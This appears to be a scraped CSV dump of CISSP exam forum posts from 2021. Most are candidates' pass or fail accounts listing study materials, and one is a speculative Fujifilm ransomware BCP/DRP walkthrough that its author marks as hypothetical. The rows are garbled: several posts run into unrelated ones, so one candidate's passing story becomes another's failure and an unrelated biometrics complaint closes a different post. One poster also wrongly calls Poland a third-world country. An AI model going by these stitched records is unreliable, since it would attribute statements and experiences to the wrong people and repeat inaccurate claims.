1996,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07
1997,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me.

1999,oexlqz,Cue the panic - 5 days until exam date,"Like many, I've just been lurking here, reading nearly every success and horror story. I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it.

2001,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.

Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.

2021,ob3mpw,Provisionally Passed 21 June 2021!!!,"150 questions in about 2 hours.  I made my first attempt about 4 years ago. On February 2021 I decided to give it another try. I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail. 

Experience:

I have about 14 years of experience in various roles as a SOC analyst, RMF roles, and engineering roles.

Thank you.",2021-06-30
2024,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server.

* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.

* 11th Hour - so general I fell asleep

2028,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

2029,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days.

I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

What are your thoughts?",2021-06-29
2031,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29
2032,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29
2033,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29

I studied for a few months, got employed, and postponed the exam... a big mistake. So I got unemployed again last May, been studying for the test and will be taking it next week.

2036,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

# Resources I used:

|Resource|Format/location|Notes|

|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |
|Eleventh Hour CISSP, 3rd Edition |Audio book|Listened all the way through twice. (7/10) |
|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |
|Destination Certification's Mind Map series|YouTube|As others have said, I don't know how/why these are free. But they're freaking awesome. I took a week of study leave before the exam and these were the core part of that week. (10/10) |

|Craig Cunningham ran a free online CISSP Review session|[Nomad-sec.com](https://Nomad-sec.com) |Really enjoyed this. I definitely benefited from the overall aproach and hearing him work through various ideas. (7/10)|
|[CISSPREP.net](https://CISSPREP.net) practice exams |[CISSPREP.net](https://CISSPREP.net)|Really useful. I took 3 of the 1 hr exams. (8/10)|
|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

